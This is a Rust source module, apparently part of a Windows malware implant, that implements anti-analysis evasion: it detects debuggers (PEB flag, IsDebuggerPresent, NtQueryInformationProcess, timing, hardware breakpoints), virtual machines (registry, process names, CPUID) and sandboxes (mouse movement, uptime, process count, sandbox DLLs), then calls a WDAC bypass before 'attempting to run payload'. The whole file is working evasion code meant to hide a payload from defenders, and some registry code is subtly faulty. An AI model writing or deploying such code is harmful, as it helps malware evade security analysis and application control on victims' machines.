// Anti-Analysis Techniques
// Detects and evades debuggers, VMs, and sandboxes

use std::ffi::CString;
use std::ptr;
use winapi::shared::minwindef::*;
use winapi::shared::ntdef::HANDLE;
use winapi::um::errhandlingapi::*;
use winapi::um::handleapi::*;
use winapi::um::libloaderapi::*;
use winapi::um::processthreadsapi::*;
use winapi::um::sysinfoapi::*;
use winapi::um::tlhelp32::*;
use winapi::um::winnt::*;
use winapi::um::winreg::*;
use winapi::um::winuser::*;

/// Check if debugger is present via PEB BeingDebugged flag
pub unsafe fn check_peb_being_debugged() -> bool {
    #[cfg(target_arch = "x86_64")]
    {
        // x64: PEB is at GS:[0x60]
        let peb: *const u8;
        std::arch::asm!(
            "mov {}, gs:[0x60]",
            out(reg) peb,
            options(nostack, nomem, preserves_flags)
        );

        if peb.is_null() {
            return false;
        }

        // BeingDebugged is at offset 0x02
        let being_debugged = *peb.add(0x02);
        being_debugged != 0
    }

    #[cfg(target_arch = "x86")]
    {
        // x86: PEB is at FS:[0x30]
        let peb: *const u8;
        std::arch::asm!(
            "mov {}, fs:[0x30]",
            out(reg) peb,
            options(nostack, nomem, preserves_flags)
        );

        if peb.is_null() {
            return false;
        }

        // BeingDebugged is at offset 0x02
        let being_debugged = *peb.add(0x02);
        being_debugged != 0
    }

    #[cfg(not(any(target_arch = "x86", target_arch = "x86_64")))]
    {
        false
    }
}

/// Check if debugger is present via IsDebuggerPresent API
pub unsafe fn check_is_debugger_present() -> bool {
    IsDebuggerPresent() != 0
}

/// Check if debugger is present via NtQueryInformationProcess
pub unsafe fn check_nt_query_debug_port() -> bool {
    // Resolve NtQueryInformationProcess dynamically
    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8);
    if ntdll.is_null() {
        return false;
    }

    type NtQueryInformationProcess = extern "system" fn(
        ProcessHandle: HANDLE,
        ProcessInformationClass: u32,
        ProcessInformation: *mut winapi::ctypes::c_void,
        ProcessInformationLength: u32,
        ReturnLength: *mut u32,
    ) -> i32;

    let func_name = CString::new("NtQueryInformationProcess").unwrap();
    let nt_query =
        GetProcAddress(ntdll, func_name.as_ptr() as *const i8) as *const NtQueryInformationProcess;

    if nt_query.is_null() {
        return false;
    }

    // ProcessDebugPort = 0x07
    let mut debug_port: usize = 0;
    let status = (*nt_query)(
        GetCurrentProcess(),
        0x07, // ProcessDebugPort
        &mut debug_port as *mut _ as *mut winapi::ctypes::c_void,
        std::mem::size_of::<usize>() as u32,
        ptr::null_mut(),
    );

    // If debug port is set, debugger is present
    status == 0 && debug_port != 0
}

/// Check if debugger is present via timing checks
pub unsafe fn check_timing_debugger() -> bool {
    let start = GetTickCount();
    Sleep(10);
    let elapsed = GetTickCount().wrapping_sub(start);

    // Debugger adds delay, so elapsed time will be > 50ms
    elapsed > 50
}

/// Check for hardware breakpoints
pub unsafe fn check_hardware_breakpoints() -> bool {
    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    let thread = GetCurrentThread();
    if GetThreadContext(thread, &mut ctx) == 0 {
        return false;
    }

    // Check if any debug registers are set
    #[cfg(target_arch = "x86_64")]
    {
        ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0
    }

    #[cfg(target_arch = "x86")]
    {
        ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0
    }

    #[cfg(not(any(target_arch = "x86", target_arch = "x86_64")))]
    {
        false
    }
}

/// Check for VM via registry
pub unsafe fn check_vm_registry() -> bool {
    // Check for VirtualBox
    let vbox_key = CString::new("SYSTEM\\CurrentControlSet\\Services\\VBoxGuest").unwrap();
    let mut hkey: HKEY = ptr::null_mut();

    if RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        vbox_key.as_ptr() as *const i8,
        0,
        KEY_READ,
        &mut hkey,
    ) == ERROR_SUCCESS
    {
        RegCloseKey(hkey);
        return true;
    }

    // Check for VMware
    let vmware_key = CString::new("HARDWARE\\Description\\System").unwrap();
    if RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        vmware_key.as_ptr() as *const i8,
        0,
        KEY_READ,
        &mut hkey,
    ) == ERROR_SUCCESS
    {
        let mut value_name = [0u8; 256];
        let mut value_type: DWORD = 0;
        let mut value_data = [0u8; 256];
        let mut value_size: DWORD = 256;

        let mut index = 0u32;
        while RegEnumValueA(
            hkey,
            index,
            value_name.as_mut_ptr() as *mut i8,
            &mut value_size,
            ptr::null_mut(),
            &mut value_type,
            value_data.as_mut_ptr(),
            &mut value_size,
        ) == ERROR_SUCCESS
        {
            let value_str = String::from_utf8_lossy(&value_data[..value_size as usize]);
            if value_str.contains("VMware") || value_str.contains("VMwareVMware") {
                RegCloseKey(hkey);
                return true;
            }
            index += 1;
            value_size = 256;
        }
        RegCloseKey(hkey);
    }

    false
}

/// Check for VM via process enumeration
pub unsafe fn check_vm_processes() -> bool {
    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if snapshot == INVALID_HANDLE_VALUE {
        return false;
    }

    let mut entry: PROCESSENTRY32 = std::mem::zeroed();
    entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

    if Process32First(snapshot, &mut entry) == 0 {
        CloseHandle(snapshot);
        return false;
    }

    let vm_processes = [
        b"vmtoolsd.exe\0",
        b"VBoxService.exe\0",
        b"vbox.exe\0",
        b"vmwaretray.exe\0",
        b"vmwareuser.exe\0",
    ];

    loop {
        // Convert entry.szExeFile to string (null-terminated)
        let entry_name_bytes = entry
            .szExeFile
            .iter()
            .take_while(|&&b| b != 0)
            .copied()
            .collect::<Vec<u8>>();
        let entry_name = String::from_utf8_lossy(&entry_name_bytes).to_lowercase();

        for vm_proc in &vm_processes {
            // Remove null terminator for comparison
            let proc_name_bytes = vm_proc
                .iter()
                .take_while(|&&b| b != 0)
                .copied()
                .collect::<Vec<u8>>();
            let proc_name = String::from_utf8_lossy(&proc_name_bytes).to_lowercase();

            if entry_name == proc_name {
                CloseHandle(snapshot);
                return true;
            }
        }

        if Process32Next(snapshot, &mut entry) == 0 {
            break;
        }
    }

    CloseHandle(snapshot);
    false
}

/// Check for VM via CPUID
pub unsafe fn check_vm_cpuid() -> bool {
    #[cfg(target_arch = "x86_64")]
    {
        // Check hypervisor bit (bit 31 of ECX)
        let mut eax: u32 = 1;
        let mut ebx: u32 = 0;
        let mut ecx: u32 = 0;
        let mut edx: u32 = 0;

        std::arch::asm!(
            "cpuid",
            inout("eax") eax,
            out("ebx") ebx,
            inout("ecx") ecx,
            out("edx") edx,
            options(nostack, preserves_flags)
        );

        // Check hypervisor bit
        if (ecx & (1 << 31)) != 0 {
            // Check vendor string
            let mut vendor = [0u32; 4];
            eax = 0x40000000;
            std::arch::asm!(
                "cpuid",
                inout("eax") eax,
                out("ebx") vendor[0],
                out("ecx") vendor[1],
                out("edx") vendor[2],
                options(nostack, preserves_flags)
            );

            // Check for known VM vendor strings
            let vendor_bytes =
                std::slice::from_raw_parts(vendor.as_ptr() as *const u8, vendor.len() * 4);
            let vendor_str = String::from_utf8_lossy(vendor_bytes);

            if vendor_str.contains("VMwareVMware")
                || vendor_str.contains("VBoxVBoxVBox")
                || vendor_str.contains("Microsoft Hv")
            {
                return true;
            }
        }
    }

    #[cfg(target_arch = "x86")]
    {
        // Similar for x86
        let mut eax: u32 = 1;
        let mut ecx: u32 = 0;

        std::arch::asm!(
            "cpuid",
            inout("eax") eax,
            out("ecx") ecx,
            options(nostack, preserves_flags)
        );

        if (ecx & (1 << 31)) != 0 {
            return true;
        }
    }

    false
}

/// Check for sandbox via mouse movement
pub unsafe fn check_sandbox_mouse() -> bool {
    let mut point1: POINT = std::mem::zeroed();
    let mut point2: POINT = std::mem::zeroed();

    if GetCursorPos(&mut point1) == 0 {
        return false;
    }

    Sleep(5000); // Wait 5 seconds

    if GetCursorPos(&mut point2) == 0 {
        return false;
    }

    // If mouse hasn't moved, likely a sandbox
    point1.x == point2.x && point1.y == point2.y
}

/// Check for sandbox via runtime checks
pub unsafe fn check_sandbox_runtime() -> bool {
    // Check system uptime (sandboxes often have low uptime)
    let uptime = GetTickCount();
    if uptime < 120000 {
        // Less than 2 minutes uptime
        return true;
    }

    // Check number of processes (sandboxes have few)
    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if snapshot == INVALID_HANDLE_VALUE {
        return false;
    }

    let mut entry: PROCESSENTRY32 = std::mem::zeroed();
    entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

    let mut process_count = 0u32;
    if Process32First(snapshot, &mut entry) != 0 {
        loop {
            process_count += 1;
            if Process32Next(snapshot, &mut entry) == 0 {
                break;
            }
        }
    }

    CloseHandle(snapshot);

    // Sandboxes typically have < 50 processes
    if process_count < 50 {
        return true;
    }

    false
}

/// Check for sandbox via DLL detection
pub unsafe fn check_sandbox_dlls() -> bool {
    let sandbox_dlls = [
        b"sbiedll.dll\0",
        b"dbghelp.dll\0",
        b"api_log.dll\0",
        b"pstorec.dll\0",
        b"vmcheck.dll\0",
    ];

    for dll_name in &sandbox_dlls {
        let dll_cstr = CString::from_vec_with_nul(dll_name.to_vec()).unwrap();
        let module = GetModuleHandleA(dll_cstr.as_ptr() as *const i8);
        if !module.is_null() {
            return true;
        }
    }

    false
}

/// Comprehensive anti-analysis check
pub unsafe fn check_environment(anti_debug: bool, anti_vm: bool) -> bool {
    if anti_debug {
        if check_peb_being_debugged() {
            return true; // Debugger detected
        }
        if check_is_debugger_present() {
            return true;
        }
        if check_nt_query_debug_port() {
            return true;
        }
        if check_timing_debugger() {
            return true;
        }
        if check_hardware_breakpoints() {
            return true;
        }
    }

    if anti_vm {
        if check_vm_registry() {
            return true; // VM detected
        }
        if check_vm_processes() {
            return true;
        }
        if check_vm_cpuid() {
            return true;
        }
    }

    // Always check for sandbox (critical)
    if check_sandbox_mouse() {
        return true; // Sandbox detected
    }
    if check_sandbox_runtime() {
        return true;
    }
    if check_sandbox_dlls() {
        return true;
    }

    false // Environment is clean
}

/// Check and bypass WDAC if present
/// This should be called early in execution, before attempting to run payload
pub unsafe fn check_wdac_and_bypass() -> bool {
    use crate::wdac_bypass::check_and_bypass_wdac;
    check_and_bypass_wdac()
}
